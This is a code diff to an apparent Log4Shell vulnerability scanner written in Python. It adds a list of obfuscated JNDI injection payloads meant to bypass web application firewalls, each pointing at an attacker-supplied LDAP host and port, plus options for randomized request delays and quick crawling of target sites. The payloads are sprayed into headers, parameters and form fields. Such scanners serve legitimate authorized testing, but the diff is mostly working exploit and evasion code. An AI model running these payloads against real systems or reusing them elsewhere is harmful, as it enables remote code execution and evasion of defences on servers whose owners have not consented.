@@ -8,6 +8,7 @@ from urllib.parse import urljoin
 TIMEOUT = 3
 WAIT_MIN = 500000
 WAIT_RAND_MAX = 600000
+
 HEADER_UA = {'1': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36', 
              '2': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
              '3': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
@@ -29,8 +30,20 @@ HEADER_CLASSIC = {'Accept': '*/*',
                   'Cache-control': 'max-age=0',
                   'Referer': 'https://{{PAYLOAD}}',
                   'User-agent': '{{PAYLOAD}}'}
+
 PAYLOAD_CLASSIC = ['${jndi:ldap://{{EVIL}}:{{PORT}}/a}', '${jndi:ldap://127.0.0.1#{{EVIL}}:{{PORT}}/a}']
+PAYLOAD_NASTY = ['${${lower:jndi}:${lower:ldap}://{{EVIL}}:{{PORT}}/a}',
+                 '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{EVIL}}:{{PORT}}/a}', 
+                 '${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{EVIL}}:{{PORT}}/a}',
+                 '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//{{EVIL}}:{{PORT}}/a}',
+                 '${${sys:SYS_NAME:-j}ndi${sys:SYS_NAME:-:}${sys:SYS_NAME:-l}dap${sys:SYS_NAME:-:}//{{EVIL}}:{{PORT}}/a}',
+                 '${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://{{EVIL}}:{{PORT}}/a}',
+                 '${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{EVIL}}:{{PORT}}/a}',
+                 '${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{EVIL}}:{{PORT}}/a}',
+                 "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://{{EVIL}}:{{PORT}}/a}",
+                 '${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{EVIL}}:{{PORT}}/a}']
 PAYLOAD_FILES = {'ldap': 'waf_bypass_ldap.txt', 'http': 'waf_bypass_http.txt', 'dns': 'waf_bypass_dns.txt'}
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -81,6 +94,12 @@ def get_payloads(_payload, _evil_site, _evil_port, _callback):
         line = line.replace('{{EVIL}}', _evil_site)
         line = line.replace('{{PORT}}', _evil_port)
         payloads.append(line)
+
+  elif _payload == 'nasty':
+    for p in PAYLOAD_NASTY:
+      payload = p.replace('{{EVIL}}', _evil_site)
+      payload = payload.replace('{{PORT}}', _evil_port)
+      payloads.append(payload)
 
   return payloads
 
@@ -146,6 +165,8 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
         creds64_m = creds64_b.decode('ascii')
         headers.update({'Authorization': 'Basic ' + creds64_m})
         requests.request(url=_url, method='GET', headers=headers, verify=False, timeout=TIMEOUT)
+
+        time.sleep((WAIT_MIN + random.randint(1, WAIT_RAND_MAX)) / 1000000.0)
         cpt_payloads = cpt_payloads + 1
         continue 
 
@@ -176,8 +197,8 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
       except Exception as e:
         cprint('[!] Potential vulnerability found: true positive or network blocking (check out in Active/Passive Callback Modules logs)', 'red', attrs=['bold'])
       
-      # _data = full
-      if _data == 'full':
+      # _data = extended
+      if _data == 'extended':
         for val in inputs:
           headers = get_headers(_header, payload)
           data = {}
@@ -211,8 +232,8 @@ def main():
   parser.add_argument('--method', action='store', default='get', dest='method', help='get, post or both')
   parser.add_argument('--param', action='store', default='classic', dest='param', help='none or classic')
   parser.add_argument('--header', action='store', default='classic', dest='header', help='none, classic or noua')
-  parser.add_argument('--data', action='store', default='classic', dest='data', help='classic or full')
-  parser.add_argument('--payload', action='store', default='classic', dest='payload', help='classic, random or extended')
+  parser.add_argument('--data', action='store', default='classic', dest='data', help='classic or extended')
+  parser.add_argument('--payload', action='store', default='classic', dest='payload', help='classic, random, extended or nasty')
   args = parser.parse_args()
 
   try:
@@ -280,14 +301,21 @@ def main():
     time.sleep(1)
 
     for main_url in _url:
-      if _crawl == 'yes':
+      if _crawl == 'yes' or _crawl == 'quick':
         cprint('[!] -------------------------------------', 'cyan')
         cprint(f'[!] Processing {main_url}', 'cyan', attrs=['bold'])
+        if _crawl == 'quick':
+          cprint('[!] Quick crawl is limited to 10 URL', 'cyan')
 
         queue = []
         queue.append(main_url)
 
+        quick = 0
         for u in queue:
+          if _crawl == 'quick':
+            if quick >= 10:
+              continue
+            quick = quick + 1
           try:
             html = requests.get(u, verify=False).text
           except:
